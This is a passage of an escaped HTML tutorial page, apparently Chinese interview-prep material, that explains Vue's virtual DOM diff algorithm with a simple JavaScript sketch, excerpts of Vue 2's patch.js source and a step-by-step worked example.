class=\\"tip\\">\\n<ul>\\n<li>同级比较，再比较子节点（根据<code>key</code>和<code>tag</code>标签名判断）</li>\\n<li>先判断一方有子节点和一方没有子节点的情况(如果新的<code>children</code>没有子节点，将旧的子节点移除)</li>\\n<li>比较都有子节点的情况(核心<code>diff</code>)</li>\\n<li>递归比较子节点</li>\\n</ul>\\n</div>\\n<ul>\\n<li>正常<code>Diff</code>两个树的时间复杂度是<code>O(n^3)</code>，但实际情况下我们很少会进行跨层级的移动<code>DOM</code>，所以<code>Vue</code>将<code>Diff</code>进行了优化，从<code>O(n^3) -&gt; O(n)</code>，只有当新旧<code>children</code>都为多个子节点时才需要用核心的<code>Diff</code>算法进行同层级比较。</li>\\n<li><code>Vue2</code>的核心<code>Diff</code>算法采用了<code>双端比较</code>的算法，同时从新旧<code>children</code>的两端开始进行比较，借助<code>key</code>值找到可复用的节点，再进行相关操作。相比<code>React</code>的<code>Diff</code>算法，同样情况下可以减少移动节点次数，减少不必要的性能损耗，更加的优雅</li>\\n<li>在创建<code>VNode</code>时就确定其类型，以及在<code>mount/patch</code>的过程中采用位运算来判断一个<code>VNode</code>的类型，在这个基础之上再配合核心的<code>Diff</code>算法，使得性能上较<code>Vue2.x</code>有了提升</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/15b3a98fc9f361d8.png\\" alt=\\"\\"></p>\\n<blockquote>\\n<p>vue3中采用最长递增子序列来实现<code>diff</code>优化</p>\\n</blockquote>\\n<div class=\\"tip\\">\\n<p><strong>思路</strong></p>\\n<ul>\\n<li><code>diff</code>算法是干什么的</li>\\n<li>它的必要性</li>\\n<li>它何时执行</li>\\n<li>具体执行方式</li>\\n<li>拔高：说一下<code>vue3</code>中的优化</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li><code>Vue</code>中的<code>diff</code>算法称为<code>patching</code>算法，它由<code>Snabbdom</code>修改而来，虚拟<code>DOM</code>要想转化为真实<code>DOM</code>就需要通过<code>patch</code>方法转换</li>\\n<li>最初<code>Vue1.x</code>视图中每个依赖均有更新函数对应，可以做到精准更新，因此并不需要虚拟<code>DOM</code>和<code>patching</code>算法支持，但是这样粒度过细导致<code>Vue1.x</code>无法承载较大应用；<code>Vue 2.x</code>中为了降低<code>Watcher</code>粒度，每个组件只有一个<code>Watcher</code>与之对应，此时就需要引入<code>patching</code>算法才能精确找到发生变化的地方并高效更新</li>\\n<li><code>vue</code>中<code>diff</code>执行的时刻是组件内响应式数据变更触发实例执行其更新函数时，更新函数会再次执行<code>render</code>函数获得最新的虚拟<code>DOM</code>，然后执行<code>patch</code>函数，并传入新旧两次虚拟DOM，通过比对两者找到变化的地方，最后将其转化为对应的<code>DOM</code>操作</li>\\n<li><code>patch</code>过程是一个递归过程，遵循深度优先、同层比较的策略；</li>\\n</ol>\\n<p><strong>以<code>vue3</code>的<code>patch</code>为例</strong></p>\\n<ul>\\n<li>首先判断两个节点是否为相同同类节点，不同则删除重新创建</li>\\n<li>如果双方都是文本则更新文本内容</li>\\n<li>如果双方都是元素节点则递归更新子元素，同时更新元素属性</li>\\n<li>更新子节点时又分了几种情况\\n<ul>\\n<li>新的子节点是文本，老的子节点是数组则清空，并设置文本；</li>\\n<li>新的子节点是文本，老的子节点是文本则直接更新文本；</li>\\n<li>新的子节点是数组，老的子节点是文本则清空文本，并创建新子节点数组中的子元素；</li>\\n<li>新的子节点是数组，老的子节点也是数组，那么比较两组子节点，更新细节blabla</li>\\n</ul>\\n</li>\\n<li><code>vue3</code>中引入的更新策略：静态节点标记等</li>\\n</ul>\\n</div>\\n<p><strong>vdom中diff算法的简易实现</strong></p>\\n<p>以下代码只是帮助大家理解<code>diff</code>算法的原理和流程</p>\\n<ol>\\n<li>将<code>vdom</code>转化为真实<code>dom</code>：</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>const createElement = (vnode) =&gt; {\\n  let tag = vnode.tag;\\n  let attrs = vnode.attrs || {};\\n  let children = vnode.children || [];\\n  if(!tag) {\\n    return null;\\n  }\\n  //创建元素\\n  let elem = document.createElement(tag);\\n  //属性\\n  let attrName;\\n  for (attrName in attrs) {\\n    if(attrs.hasOwnProperty(attrName)) {\\n      elem.setAttribute(attrName, attrs[attrName]);\\n    }\\n  }\\n  //子元素\\n  children.forEach(childVnode =&gt; {\\n    //给elem添加子元素\\n    elem.appendChild(createElement(childVnode));\\n  })\\n\\n  //返回真实的dom元素\\n  return elem;\\n}\\n</code></pre>\\n<ol start=\\"2\\">\\n<li>用简易<code>diff</code>算法做更新操作</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>function updateChildren(vnode, newVnode) {\\n  let children = vnode.children || [];\\n  let newChildren = newVnode.children || [];\\n\\n  children.forEach((childVnode, index) =&gt; {\\n    let newChildVNode = newChildren[index];\\n    if(childVnode.tag === newChildVNode.tag) {\\n      //深层次对比, 递归过程\\n      updateChildren(childVnode, newChildVNode);\\n    } else {\\n      //替换\\n      replaceNode(childVnode, newChildVNode);\\n    }\\n  })\\n}\\n</code></pre>\\n<p>&lt;details&gt;&lt;summary&gt;&lt;b&gt;Vue diff相关源码&lt;/b&gt;&lt;/summary&gt;</p>\\n<pre class=\\"language-js\\"><code>// src/core/vdom/patch.js 700\\n\\nfunction assertNodeMatch (node, vnode, inVPre) {\\n    if (isDef(vnode.tag)) {\\n      return vnode.tag.indexOf(&#39;vue-component&#39;) === 0 || (\\n        !isUnknownElement(vnode, inVPre) &amp;&amp;\\n        vnode.tag.toLowerCase() === (node.tagName &amp;&amp; node.tagName.toLowerCase())\\n      )\\n    } else {\\n      return node.nodeType === (vnode.isComment ? 8 : 3)\\n    }\\n  }\\n\\n  return function patch (oldVnode, vnode, hydrating, removeOnly) {\\n    if (isUndef(vnode)) { // 此为组件卸载逻辑\\n      if (isDef(oldVnode)) invokeDestroyHook(oldVnode)\\n      return\\n    }\\n\\n    let isInitialPatch = false\\n    const insertedVnodeQueue = []\\n\\n    if (isUndef(oldVnode)) { // 此为组件挂载\\n      // empty mount (likely as component), create new root element\\n      isInitialPatch = true\\n      createElm(vnode, insertedVnodeQueue)\\n    } else {\\n      const isRealElement = isDef(oldVnode.nodeType)\\n      if (!isRealElement &amp;&amp; sameVnode(oldVnode, vnode)) {\\n        // patch existing root node  patchVnode\\n        patchVnode(oldVnode, vnode, insertedVnodeQueue, null, null, removeOnly)\\n      } else {\\n        if (isRealElement) { // 真实元素挂载\\n          // mounting to a real element\\n          // check if this is server-rendered content and if we can perform\\n          // a successful hydration.\\n          if (oldVnode.nodeType === 1 &amp;&amp; oldVnode.hasAttribute(SSR_ATTR)) {\\n            oldVnode.removeAttribute(SSR_ATTR)\\n            hydrating = true\\n          }\\n          if (isTrue(hydrating)) {\\n            if (hydrate(oldVnode, vnode, insertedVnodeQueue)) {\\n              invokeInsertHook(vnode, insertedVnodeQueue, true)\\n              return oldVnode\\n            } else if (process.env.NODE_ENV !== &#39;production&#39;) {\\n              warn(\\n                &#39;The client-side rendered virtual DOM tree is not matching &#39; +\\n                &#39;server-rendered content. This is likely caused by incorrect &#39; +\\n                &#39;HTML markup, for example nesting block-level elements inside &#39; +\\n                &#39;&lt;p&gt;, or missing &lt;tbody&gt;. Bailing hydration and performing &#39; +\\n                &#39;full client-side render.&#39;\\n              )\\n            }\\n          }\\n          // either not server-rendered, or hydration failed.\\n          // create an empty node and replace it\\n          oldVnode = emptyNodeAt(oldVnode) // 根据真实元素 产生虚拟节点\\n        }\\n\\n        // replacing existing element\\n        const oldElm = oldVnode.elm\\n        const parentElm = nodeOps.parentNode(oldElm) // 找到父亲\\n\\n        // create new node  创建新节点\\n        createElm(\\n          vnode,\\n          insertedVnodeQueue,\\n          // extremely rare edge case: do not insert if old element is in a\\n          // leaving transition. Only happens when combining transition +\\n          // keep-alive + HOCs. (#4590)\\n          oldElm._leaveCb ? null : parentElm,\\n          nodeOps.nextSibling(oldElm)\\n        )\\n\\n        // update parent placeholder node element, recursively\\n        if (isDef(vnode.parent)) { // 依次更新父占位符\\n          let ancestor = vnode.parent\\n          const patchable = isPatchable(vnode)\\n          while (ancestor) {\\n            for (let i = 0; i &lt; cbs.destroy.length; ++i) {\\n              cbs.destroy[i](ancestor)\\n            }\\n            ancestor.elm = vnode.elm\\n            if (patchable) {\\n              for (let i = 0; i &lt; cbs.create.length; ++i) {\\n                cbs.create[i](emptyNode, ancestor)\\n              }\\n              // #6513\\n              // invoke insert hooks that may have been merged by create hooks.\\n              // e.g. for directives that uses the &quot;inserted&quot; hook.\\n              const insert = ancestor.data.hook.insert\\n              if (insert.merged) {\\n                // start at index 1 to avoid re-invoking component mounted hook\\n                for (let i = 1; i &lt; insert.fns.length; i++) {\\n                  insert.fns[i]()\\n                }\\n              }\\n            } else {\\n              registerRef(ancestor)\\n            }\\n            ancestor = ancestor.parent\\n          }\\n        }\\n\\n        // destroy old node\\n        if (isDef(parentElm)) { // 销毁老节点\\n          removeVnodes([oldVnode], 0, 0)\\n        } else if (isDef(oldVnode.tag)) {\\n          invokeDestroyHook(oldVnode)\\n        }\\n      }\\n    }\\n    // 调用插入的钩子 -》 callInsert\\n    invokeInsertHook(vnode, insertedVnodeQueue, isInitialPatch)\\n    return vnode.elm\\n  }\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 比较两个虚拟节点\\nfunction patchVnode (\\n    oldVnode,\\n    vnode,\\n    insertedVnodeQueue,\\n    ownerArray,\\n    index,\\n    removeOnly\\n  ) {\\n    if (oldVnode === vnode) {\\n      return\\n    }\\n\\n    if (isDef(vnode.elm) &amp;&amp; isDef(ownerArray)) {\\n      // clone reused vnode\\n      vnode = ownerArray[index] = cloneVNode(vnode)\\n    }\\n\\n    const elm = vnode.elm = oldVnode.elm // 复用老节点\\n\\n    if (isTrue(oldVnode.isAsyncPlaceholder)) { // 如果是异步占位符跳过\\n      if (isDef(vnode.asyncFactory.resolved)) {\\n        hydrate(oldVnode.elm, vnode, insertedVnodeQueue)\\n      } else {\\n        vnode.isAsyncPlaceholder = true\\n      }\\n      return\\n    }\\n\\n    // reuse element for static trees.\\n    // note we only do this if the vnode is cloned -\\n    // if the new node is not cloned it means the render functions have been\\n    // reset by the hot-reload-api and we need to do a proper re-render.\\n    if (isTrue(vnode.isStatic) &amp;&amp;\\n      isTrue(oldVnode.isStatic) &amp;&amp;\\n      vnode.key === oldVnode.key &amp;&amp; // 都是静态节点，key相同\\n      (isTrue(vnode.isCloned) || isTrue(vnode.isOnce)) // 是克隆节点 或者 带有once，直接复用\\n    ) {\\n      vnode.componentInstance = oldVnode.componentInstance\\n      return\\n    } \\n\\n    let i // 组件更新逻辑\\n    const data = vnode.data\\n    if (isDef(data) &amp;&amp; isDef(i = data.hook) &amp;&amp; isDef(i = i.prepatch)) {\\n      i(oldVnode, vnode)\\n    }\\n\\n    const oldCh = oldVnode.children\\n    const ch = vnode.children\\n    if (isDef(data) &amp;&amp; isPatchable(vnode)) { // 调用更新方法\\n      for (i = 0; i &lt; cbs.update.length; ++i) cbs.update[i](oldVnode, vnode)\\n      if (isDef(i = data.hook) &amp;&amp; isDef(i = i.update)) i(oldVnode, vnode)\\n    }\\n    if (isUndef(vnode.text)) { // 如果不是文本节点\\n      if (isDef(oldCh) &amp;&amp; isDef(ch)) { // 两方都有儿子, 而且不是同一个儿子\\n        if (oldCh !== ch) updateChildren(elm, oldCh, ch, insertedVnodeQueue, removeOnly)\\n      } else if (isDef(ch)) { // 如果只有新的有儿子\\n        if (process.env.NODE_ENV !== &#39;production&#39;) {\\n          checkDuplicateKeys(ch)\\n        }\\n        if (isDef(oldVnode.text)) nodeOps.setTextContent(elm, &#39;&#39;) // 删除添加新节点\\n        addVnodes(elm, null, ch, 0, ch.length - 1, insertedVnodeQueue)\\n      } else if (isDef(oldCh)) { // 如果老得有儿子\\n        removeVnodes(oldCh, 0, oldCh.length - 1) // 删除节点\\n      } else if (isDef(oldVnode.text)) { // 如果老的是文本\\n        nodeOps.setTextContent(elm, &#39;&#39;) // 清空文本中内容\\n      }\\n    } else if (oldVnode.text !== vnode.text) {\\n      nodeOps.setTextContent(elm, vnode.text) // 文本不相同直接设置新值\\n    }\\n    if (isDef(data)) { // 调用postpatch钩子\\n      if (isDef(i = data.hook) &amp;&amp; isDef(i = i.postpatch)) i(oldVnode, vnode)\\n    }\\n  }\\n\\n  function invokeInsertHook (vnode, queue, initial) {\\n    // delay insert hooks for component root nodes, invoke them after the\\n    // element is really inserted\\n    if (isTrue(initial) &amp;&amp; isDef(vnode.parent)) {\\n      vnode.parent.data.pendingInsert = queue\\n    } else {\\n      for (let i = 0; i &lt; queue.length; ++i) {\\n        queue[i].data.hook.insert(queue[i])\\n      }\\n    }\\n  }\\n\\n  let hydrationBailed = false\\n  // list of modules that can skip create hook during hydration because they\\n  // are already rendered on the client or has no need for initialization\\n  // Note: style is excluded because it relies on initial clone for future\\n  // deep updates (#7063).\\n  const isRenderedModule = makeMap(&#39;attrs,class,staticClass,staticStyle,key&#39;)\\n\\n  // Note: this is a browser-only function so we can assume elms are DOM nodes.\\n  function hydrate (elm, vnode, insertedVnodeQueue, inVPre) {\\n    let i\\n    const { tag, data, children } = vnode\\n    inVPre = inVPre || (data &amp;&amp; data.pre)\\n    vnode.elm = elm\\n\\n    if (isTrue(vnode.isComment) &amp;&amp; isDef(vnode.asyncFactory)) {\\n      vnode.isAsyncPlaceholder = true\\n      return true\\n    }\\n    // assert node match\\n    if (process.env.NODE_ENV !== &#39;production&#39;) {\\n      if (!assertNodeMatch(elm, vnode, inVPre)) {\\n        return false\\n      }\\n    }\\n    if (isDef(data)) {\\n      if (isDef(i = data.hook) &amp;&amp; isDef(i = i.init)) i(vnode, true /* hydrating */)\\n      if (isDef(i = vnode.componentInstance)) {\\n        // child component. it should have hydrated its own tree.\\n        initComponent(vnode, insertedVnodeQueue)\\n        return true\\n      }\\n    }\\n    if (isDef(tag)) {\\n      if (isDef(children)) {\\n        // empty element, allow client to pick up and populate children\\n        if (!elm.hasChildNodes()) {\\n          createChildren(vnode, children, insertedVnodeQueue)\\n        } else {\\n          // v-html and domProps: innerHTML\\n          if (isDef(i = data) &amp;&amp; isDef(i = i.domProps) &amp;&amp; isDef(i = i.innerHTML)) {\\n            if (i !== elm.innerHTML) {\\n              /* istanbul ignore if */\\n              if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp;\\n                typeof console !== &#39;undefined&#39; &amp;&amp;\\n                !hydrationBailed\\n              ) {\\n                hydrationBailed = true\\n                console.warn(&#39;Parent: &#39;, elm)\\n                console.warn(&#39;server innerHTML: &#39;, i)\\n                console.warn(&#39;client innerHTML: &#39;, elm.innerHTML)\\n              }\\n              return false\\n            }\\n          } else {\\n            // iterate and compare children lists\\n            let childrenMatch = true\\n            let childNode = elm.firstChild\\n            for (let i = 0; i &lt; children.length; i++) {\\n              if (!childNode || !hydrate(childNode, children[i], insertedVnodeQueue, inVPre)) {\\n                childrenMatch = false\\n                break\\n              }\\n              childNode = childNode.nextSibling\\n            }\\n            // if childNode is not null, it means the actual childNodes list is\\n            // longer than the virtual children list.\\n            if (!childrenMatch || childNode) {\\n              /* istanbul ignore if */\\n              if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp;\\n                typeof console !== &#39;undefined&#39; &amp;&amp;\\n                !hydrationBailed\\n              ) {\\n                hydrationBailed = true\\n                console.warn(&#39;Parent: &#39;, elm)\\n                console.warn(&#39;Mismatching childNodes vs. VNodes: &#39;, elm.childNodes, children)\\n              }\\n              return false\\n            }\\n          }\\n        }\\n      }\\n      if (isDef(data)) {\\n        let fullInvoke = false\\n        for (const key in data) {\\n          if (!isRenderedModule(key)) {\\n            fullInvoke = true\\n            invokeCreateHooks(vnode, insertedVnodeQueue)\\n            break\\n          }\\n        }\\n        if (!fullInvoke &amp;&amp; data[&#39;class&#39;]) {\\n          // ensure collecting deps for deep class bindings for future updates\\n          traverse(data[&#39;class&#39;])\\n        }\\n      }\\n    } else if (elm.data !== vnode.text) {\\n      elm.data = vnode.text\\n    }\\n    return true\\n  }\\n</code></pre>\\n<pre class=\\"language-js\\"><code>function updateChildren (parentElm, oldCh, newCh, insertedVnodeQueue, removeOnly) {\\n    let oldStartIdx = 0\\n    let newStartIdx = 0\\n    let oldEndIdx = oldCh.length - 1\\n    let oldStartVnode = oldCh[0]\\n    let oldEndVnode = oldCh[oldEndIdx]\\n    let newEndIdx = newCh.length - 1\\n    let newStartVnode = newCh[0]\\n    let newEndVnode = newCh[newEndIdx]\\n    let oldKeyToIdx, idxInOld, vnodeToMove, refElm\\n\\n    // removeOnly is a special flag used only by &lt;transition-group&gt;\\n    // to ensure removed elements stay in correct relative positions\\n    // during leaving transitions\\n    const canMove = !removeOnly\\n\\n    if (process.env.NODE_ENV !== &#39;production&#39;) {\\n      checkDuplicateKeys(newCh)\\n    }\\n    // 新老节点有一方循环完毕则patch 完毕\\n    while (oldStartIdx &lt;= oldEndIdx &amp;&amp; newStartIdx &lt;= newEndIdx) {\\n      if (isUndef(oldStartVnode)) {\\n        oldStartVnode = oldCh[++oldStartIdx] // Vnode has been moved left\\n      } else if (isUndef(oldEndVnode)) {\\n        oldEndVnode = oldCh[--oldEndIdx]\\n      } else if (sameVnode(oldStartVnode, newStartVnode)) {\\n        patchVnode(oldStartVnode, newStartVnode, insertedVnodeQueue, newCh, newStartIdx)\\n        oldStartVnode = oldCh[++oldStartIdx]\\n        newStartVnode = newCh[++newStartIdx]\\n      } else if (sameVnode(oldEndVnode, newEndVnode)) {\\n        patchVnode(oldEndVnode, newEndVnode, insertedVnodeQueue, newCh, newEndIdx)\\n        oldEndVnode = oldCh[--oldEndIdx]\\n        newEndVnode = newCh[--newEndIdx]\\n      } else if (sameVnode(oldStartVnode, newEndVnode)) { // Vnode moved right\\n        patchVnode(oldStartVnode, newEndVnode, insertedVnodeQueue, newCh, newEndIdx)\\n        canMove &amp;&amp; nodeOps.insertBefore(parentElm, oldStartVnode.elm, nodeOps.nextSibling(oldEndVnode.elm))\\n        oldStartVnode = oldCh[++oldStartIdx]\\n        newEndVnode = newCh[--newEndIdx]\\n      } else if (sameVnode(oldEndVnode, newStartVnode)) { // Vnode moved left\\n        patchVnode(oldEndVnode, newStartVnode, insertedVnodeQueue, newCh, newStartIdx)\\n        canMove &amp;&amp; nodeOps.insertBefore(parentElm, oldEndVnode.elm, oldStartVnode.elm)\\n        oldEndVnode = oldCh[--oldEndIdx]\\n        newStartVnode = newCh[++newStartIdx]\\n      } else {\\n        // 乱序比对\\n        if (isUndef(oldKeyToIdx)) oldKeyToIdx = createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx)\\n        idxInOld = isDef(newStartVnode.key)\\n          ? oldKeyToIdx[newStartVnode.key]\\n          : findIdxInOld(newStartVnode, oldCh, oldStartIdx, oldEndIdx)\\n        if (isUndef(idxInOld)) { // New element\\n          createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm, false, newCh, newStartIdx)\\n        } else {\\n          vnodeToMove = oldCh[idxInOld]\\n          if (sameVnode(vnodeToMove, newStartVnode)) {\\n            patchVnode(vnodeToMove, newStartVnode, insertedVnodeQueue, newCh, newStartIdx)\\n            oldCh[idxInOld] = undefined\\n            canMove &amp;&amp; nodeOps.insertBefore(parentElm, vnodeToMove.elm, oldStartVnode.elm)\\n          } else {\\n            // same key but different element. treat as new element\\n            createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm, false, newCh, newStartIdx)\\n          }\\n        }\\n        newStartVnode = newCh[++newStartIdx]\\n      }\\n    }\\n    if (oldStartIdx &gt; oldEndIdx) {\\n      refElm = isUndef(newCh[newEndIdx + 1]) ? null : newCh[newEndIdx + 1].elm\\n      addVnodes(parentElm, refElm, newCh, newStartIdx, newEndIdx, insertedVnodeQueue)\\n    } else if (newStartIdx &gt; newEndIdx) {\\n      removeVnodes(oldCh, oldStartIdx, oldEndIdx)\\n    }\\n  }\\n</code></pre>\\n<h3 id=\\"vue的diff算法详细分析\\"><a class=\\"header-anchor\\" href=\\"#vue的diff算法详细分析\\">#</a> Vue的diff算法详细分析</h3>\\n<p><strong>1. 是什么</strong></p>\\n<p><code>diff</code> 算法是一种通过同层的树节点进行比较的高效算法</p>\\n<p>其有两个特点：</p>\\n<ul>\\n<li>比较只会在同层级进行, 不会跨层级比较</li>\\n<li>在diff比较的过程中，循环从两边向中间比较</li>\\n</ul>\\n<p><code>diff</code> 算法在很多场景下都有应用，在 <code>vue</code> 中，作用于虚拟 <code>dom</code> 渲染成真实 <code>dom</code> 的新旧 <code>VNode</code> 节点比较</p>\\n<p><strong>2. 比较方式</strong></p>\\n<p><code>diff</code>整体策略为：深度优先，同层比较</p>\\n<ol>\\n<li>比较只会在同层级进行, 不会跨层级比较</li>\\n</ol>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/f29c33c806ecffb5.png\\" alt=\\"\\"></p>\\n<ol start=\\"2\\">\\n<li>比较的过程中，循环从两边向中间收拢</li>\\n</ol>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/8121a9b6102e5377.png\\" alt=\\"\\"></p>\\n<p>下面举个<code>vue</code>通过<code>diff</code>算法更新的例子：</p>\\n<p>新旧<code>VNode</code>节点如下图所示：</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/78fa0e7847772ef5.png\\" alt=\\"\\"></p>\\n<p>第一次循环后，发现旧节点D与新节点D相同，直接复用旧节点D作为<code>diff</code>后的第一个真实节点，同时旧节点<code>endIndex</code>移动到C，新节点的 <code>startIndex</code> 移动到了 C</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/4ddfc7e80cffdb80.png\\" alt=\\"\\"></p>\\n<p>第二次循环后，同样是旧节点的末尾和新节点的开头(都是 C)相同，同理，<code>diff</code> 后创建了 C 的真实节点插入到第一次创建的 D 节点后面。同时旧节点的 <code>endIndex</code> 移动到了 B，新节点的 <code>startIndex</code> 移动到了 E</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/7fff25b5fa48acf4.png\\" alt=\\"\\"></p>\\n<p>第三次循环中，发现E没有找到，这时候只能直接创建新的真实节点 E，插入到第二次创建的 C 节点之后。同时新节点的 <code>startIndex</code> 移动到了 A。旧节点的 <code>startIndex</code> 和 <code>endIndex</code> 都保持不动</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/4a6aa4297e796b54.png\\" alt=\\"\\"></p>\\n<p>第四次循环中，发现了新旧节点的开头(都是 A)相同，于是 <code>diff</code> 后创建了 A 的真实节点，插入到前一次创建的 E 节点后面。同时旧节点的 <code>startIndex</code> 移动到了 B，新节点的<code>startIndex</code> 移动到了 B</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/121fc9375e2537f6.png\\" alt=\\"\\"></p>\\n<p>第五次循环中，情形同第四次循环一样，因此 <code>diff</code> 后创建了 B 真实节点 插入到前一次创建的 A 节点后面。同时旧节点的 <code>startIndex</code>移动到了 C，新节点的 startIndex 移动到了 F</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/1c0782546f0e6e97.png\\" alt=\\"\\"></p>\\n<p>新节点的 <code>startIndex</code> 已经大于 <code>endIndex</code> 了，需要创建 <code>newStartIdx</code> 和 <code>newEndIdx</code> 之间的所有节点，也就是节点F，直接创建 F 节点对应的真实节点放到 B 节点后面</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/94437bcc7fdc74ba.png\\" alt=\\"\\"></p>\\n<p><strong>3. 原理分析</strong></p>\\n<p>当数据发生改变时，<code>set</code>方法会调用<code>Dep.notify</code>通知所有订阅者<code>Watcher</code>，订阅者就会调用<code>patch</code>给真实的<code>DOM</code>打补丁，更新相应的视图</p>\\n<p>源码位置：<code>src/core/vdom/patch.js</code></p>\\n<pre class=\\"language-js\\"><code>function patch(oldVnode, vnode, hydrating, removeOnly) {\\n    if (isUndef(vnode)) { // 没有新节点，直接执行destory钩子函数\\n        if (isDef(oldVnode)) invokeDestroyHook(oldVnode)\\n        return\\n    }\\n\\n    let isInitialPatch = false\\n    const insertedVnodeQueue = []\\n\\n    if (isUndef(oldVnode)) {\\n        isInitialPatch = true\\n        createElm(vnode, insertedVnodeQueue) // 没有旧节点，直接用新节点生成dom元素\\n    } else {\\n        const isRealElement = isDef(oldVnode.nodeType)\\n        if (!isRealElement &amp;&amp; sameVnode(oldVnode, vnode)) {\\n            // 判断旧节点和新节点自身一样，一致执行patchVnode\\n            patchVnode(oldVnode, vnode, insertedVnodeQueue, null, null, removeOnly)\\n        } else {\\n            // 否则直接销毁及旧节点，根据新节点生成dom元素\\n            if (isRealElement) {\\n\\n                if (oldVnode.nodeType === 1 &amp;&amp; oldVnode.hasAttribute(SSR_ATTR)) {\\n                    oldVnode.removeAttribute(SSR_ATTR)\\n                    hydrating = true\\n                }\\n                if (isTrue(hydrating)) {\\n                    if (hydrate(oldVnode, vnode, insertedVnodeQueue)) {\\n                        invokeInsertHook(vnode, insertedVnodeQueue, true)\\n                        return oldVnode\\n                    }\\n                }\\n                oldVnode = emptyNodeAt(oldVnode)\\n            }\\n            return vnode.elm\\n        }\\n    }\\n}\\n</code></pre>\\n<p><code>patch</code>函数前两个参数位为<code>oldVnode</code> 和 <code>Vnode</code> ，分别代表新的节点和之前的旧节点，主要做了四个判断：</p>\\n<ul>\\n<li>没有新节点，直接触发旧节点的<code>destory</code>钩子</li>\\n<li>没有旧节点，说明是页面刚开始初始化的时候，此时，根本不需要比较了，直接全是新建，所以只调用 <code>createElm</code></li>\\n<li>旧节点和新节点自身一样，通过 <code>sameVnode</code> 判断节点是否一样，一样时，直接调用 <code>patchVnode</code>去处理这两个节点</li>\\n<li>旧节点和新节点自身不一样，当两个节点不一样的时候，直接创建新节点，删除旧节点</li>\\n</ul>\\n<p>下面主要讲的是<code>patchVnode</code>部分</p>\\n<pre class=\\"language-js\\"><code>function patchVnode (oldVnode, vnode, insertedVnodeQueue, removeOnly) {\\n    // 如果新旧节点一致，什么都不做\\n    if (oldVnode === vnode) {\\n      return\\n    }\\n\\n    // 让vnode.el引用到现在的真实dom，当el修改时，vnode.el会同步变化\\n    const elm = vnode.elm = oldVnode.elm\\n\\n    // 异步占位符\\n    if (isTrue(oldVnode.isAsyncPlaceholder)) {\\n      if (isDef(vnode.asyncFactory.resolved)) {\\n        hydrate(oldVnode.elm, vnode, insertedVnodeQueue)\\n      } else {\\n        vnode.isAsyncPlaceholder = true\\n      }\\n      return\\n    }\\n    // 如果新旧都是静态节点，并且具有相同的key\\n    // 当vnode是克隆节点或是v-once指令控制的节点时，只需要把oldVnode.elm和oldVnode.child都复制到vnode上\\n    // 也不用再有其他操作\\n    if (isTrue(vnode.isStatic) &amp;&amp;\\n      isTrue(oldVnode.isStatic) &amp;&amp;\\n      vnode.key === oldVnode.key &amp;&amp;\\n      (isTrue(vnode.isCloned) || isTrue(vnode.isOnce))\\n    ) {\\n      vnode.componentInstance = oldVnode.componentInstance\\n      return\\n    }\\n\\n    let i\\n    const data = vnode.data\\n    if (isDef(data) &amp;&amp; isDef(i = data.hook) &amp;&amp; isDef(i = i.prepatch)) {\\n      i(oldVnode, vnode)\\n    }\\n\\n    const oldCh = oldVnode.children\\n    const ch = vnode.children\\n    if (isDef(data) &amp;&amp; isPatchable(vnode)) {\\n      for (i = 0; i &lt; cbs.update.length; ++i) cbs.update[i](oldVnode, vnode)\\n      if (isDef(i = data.hook) &amp;&amp; isDef(i = i.update)) i(oldVnode, vnode)\\n    }\\n    // 如果vnode不是文本节点或者注释节点\\n    if (isUndef(vnode.text)) {\\n      // 并且都有子节点\\n      if (isDef(oldCh) &amp;&amp; isDef(ch)) {\\n        // 并且子节点不完全一致，则调用updateChildren\\n        if (oldCh !== ch) updateChildren(elm, oldCh, ch, insertedVnodeQueue, removeOnly)\\n\\n        // 如果只有新的vnode有子节点\\n      } else if (isDef(ch)) {\\n        if (isDef(oldVnode.text)) nodeOps.setTextContent(elm, &#39;&#39;)\\n        // elm已经引用了老的dom节点，在老的dom节点上添加子节点\\n        addVnodes(elm, null, ch, 0, ch.length - 1, insertedVnodeQueue)\\n\\n        // 如果新vnode没有子节点，而vnode有子节点，直接删除老的oldCh\\n      } else if (isDef(oldCh)) {\\n        removeVnodes(elm, oldCh, 0, oldCh.length - 1)\\n\\n        // 如果老节点是文本节点\\n      } else if (isDef(oldVnode.text)) {\\n        nodeOps.setTextContent(elm, &#39;&#39;)\\n      }\\n\\n      // 如果新vnode和老vnode是文本节点或注释节点\\n      // 但是vnode.text != oldVnode.text时，只需要更新vnode.elm的文本内容就可以\\n    } else if (oldVnode.text !== vnode.text) {\\n      nodeOps.setTextContent(elm, vnode.text)\\n    }\\n    if (isDef(data)) {\\n      if (isDef(i = data.hook) &amp;&amp; isDef(i = i.postpatch)) i(oldVnode, vnode)\\n    }\\n  }\\n</code></pre>\\n<p><strong><code>patchVnode</code>主要做了几个判断：</strong></p>\\n<ul>\\n<li>新节点是否是文本节点，如果是，则直接更新<code>dom</code>的文本内容为新节点的文本内容</li>\\n<li>新节点和旧节点如果都有子节点，则处理比较更新子节点</li>\\n<li>只有新节点有子节点，旧节点没有，那么不用比较了，所有节点都是全新的，所以直接全部新建就好了，新建是指创建出所有新<code>DOM</code>，并且添加进父节点</li>\\n<li>只有旧节点有子节点而新节点没有，说明更新后的页面，旧节点全部都不见了，那么要做的，就是把所有的旧节点删除，也就是直接把<code>DOM</code> 删除</li>\\n</ul>\\n<p>子节点不完全一致，则调用<code>updateChildren</code></p>\\n<pre class=\\"language-js\\"><code>function updateChildren (parentElm, oldCh, newCh, insertedVnodeQueue, removeOnly) {\\n    let oldStartIdx = 0 // 旧头索引\\n    let newStartIdx = 0 // 